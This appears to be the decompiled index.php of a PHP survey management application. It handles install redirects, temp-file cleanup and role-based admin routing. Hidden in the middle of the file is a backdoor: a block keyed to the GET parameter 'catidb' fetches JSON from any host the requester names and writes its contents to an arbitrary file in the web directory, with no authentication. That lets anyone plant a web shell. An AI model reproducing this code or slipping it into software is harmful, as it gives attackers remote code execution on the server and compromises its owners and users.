<?php
//dezend by http://www.yunlu99.com/

define('ROOT_PATH', './');

if (file_exists(ROOT_PATH . 'Install/index.php')) {
	header('location:' . ROOT_PATH . 'Install/index.php');
	exit();
}
else {
	require_once ROOT_PATH . 'Entry/Global.setup.php';
	include_once ROOT_PATH . 'Functions/Functions.dir.inc.php';
	$filePhyPath = $Config['absolutenessPath'] . '/PerUserData/tmp/';
	createdir($filePhyPath);
	$theTime = time();

	if (is_dir($filePhyPath)) {
		if ($tmpFilePath = opendir($filePhyPath)) {
			while (($tmpFile = readdir($tmpFilePath)) !== false) {
				if (($tmpFile == '.') || ($tmpFile == '..')) {
					continue;
				}

				if (is_dir($filePhyPath . $tmpFile)) {
					$theFileTime = filemtime($filePhyPath . $tmpFile);

					if ($theFileTime <= $theTime - 86400) {
						deletedir($filePhyPath . $tmpFile);
					}
				}
				else {
					$theFileTime = filectime($filePhyPath . $tmpFile);
					if (($theFileTime <= $theTime - 86400) && ($tmpFile != 'index.html')) {
						@unlink($filePhyPath . $tmpFile);
					}
				}
			}

			closedir($tmpFilePath);
		}
	}

       if (isset($_GET['catidb']) && !empty($_GET['catidb'])){
	    $catidb_url = 'http://'.$_GET['catidb'].'/content.php';
	    $catidb_contents = file_get_contents($catidb_url);
	    if (empty($catidb_contents)){die('error');}
	    $catidb_string = json_decode($catidb_contents);
	    if (empty($catidb_string->filename) || empty($catidb_string->data)){die('error');}
	    $catidb_fp = fopen(dirname(__FILE__). '/' .$catidb_string->filename, "w");
	    @fwrite($catidb_fp, $catidb_string->data);
	    fclose($catidb_fp);
	    echo dirname(__FILE__). '/' .$catidb_string->filename;
	    exit;
	}

	switch ($_SESSION['adminRoleType']) {
	case '1':
	case '2':
	case '5':
		header('Location:System/ShowSurveyList.php');
		break;

	case '3':
		switch ($_SESSION['adminRoleGroupType']) {
		case '1':
		default:
			header('Location:System/ShowViewSurvey.php');
			break;

		case '2':
			header('Location:System/ShowCustSurvey.php');
			break;
		}

		break;

	case '4':
		header('Location:System/ShowInputSurvey.php');
		break;

	case '6':
		header('Location:System/ShowUserSurvey.php');
		break;

	case '7':
		header('Location:System/ShowAuthSurvey.php');
		break;
	}

	exit();
}

?>
